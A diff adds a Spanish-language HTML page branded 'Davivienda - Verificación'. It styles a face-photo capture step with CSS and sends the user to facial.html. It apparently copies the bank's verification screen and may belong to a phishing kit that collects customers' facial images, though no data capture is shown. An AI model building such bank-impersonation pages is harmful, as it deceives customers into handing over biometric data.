@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Davivienda - Verificación</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        
+        /* Fondo gris muy claro como la imagen 2 */
+        body { 
+            background-color: #F4F4F4; 
+            display: flex; 
+            justify-content: center; 
+            min-height: 100vh; 
+            align-items: flex-start; /* Centrado vertical parcial */
+        }
+        
+        .container { 
+            width: 100%; 
+            max-width: 480px; 
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centrado horizontal de elementos */
+            text-align: center; /* CENTRADO DE TEXTO TOTAL */
+        }
+
+        /* --- Estilo de Texto Centrado de la Imagen 2 --- */
+        .title { 
+            font-size: 34px; 
+            font-weight: 700; /* Negrita Fuerte */
+            color: #000000; 
+            line-height: 1.1;
+            margin-bottom: 25px; 
+        }
+
+        .desc { 
+            font-size: 19px; 
+            font-weight: 400; /* Texto normal, no negrita */
+            color: #555555; /* Gris más suave */
+            line-height: 1.5;
+            max-width: 90%; /* Aire a los lados */
+            margin-bottom: 35px;
+        }
+
+        /* --- El Círculo Aqua (Mantenido Original) --- */
+        .photo-wrapper {
+            margin: 20px 0;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .circle-glow {
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            /* Borde degradado aqua original */
+            border: 10px solid transparent;
+            background-image: linear-gradient(white, white), 
+                              linear-gradient(135deg, #e0f7fa 0%, #00CED1 50%, #e0f7fa 100%);
+            background-origin: border-box;
+            background-clip: content-box, border-box;
+            /* Resplandor suave aqua original */
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.4);
+        }
+
+        .avatar { 
+            width: 85%; 
+            height: auto; 
+        }
+
+        /* Botón Davivienda */
+        .btn-red {
+            background-color: #ed1c24; 
+            color: #fff; 
+            border: none; 
+            padding: 14px 60px;
+            border-radius: 25px; 
+            font-weight: bold; 
+            font-size: 16px;
+            margin-top: 50px; 
+            cursor: pointer;
+            width: auto;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1 class="title">Tome una foto<br>de su rostro</h1>
+    <p class="desc">
+        Busque un espacio iluminado y haga una expresión neutra no use gafas, sombreros ni accesorios que cubran su rostro.
+    </p>
+
+    <div class="photo-wrapper">
+        <div class="circle-glow">
+            <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="avatar">
+        </div>
+    </div>
+
+    <button class="btn-red" onclick="window.location.href='facial.html'">Continuar</button>
+</div>
+
+</body>
+</html>
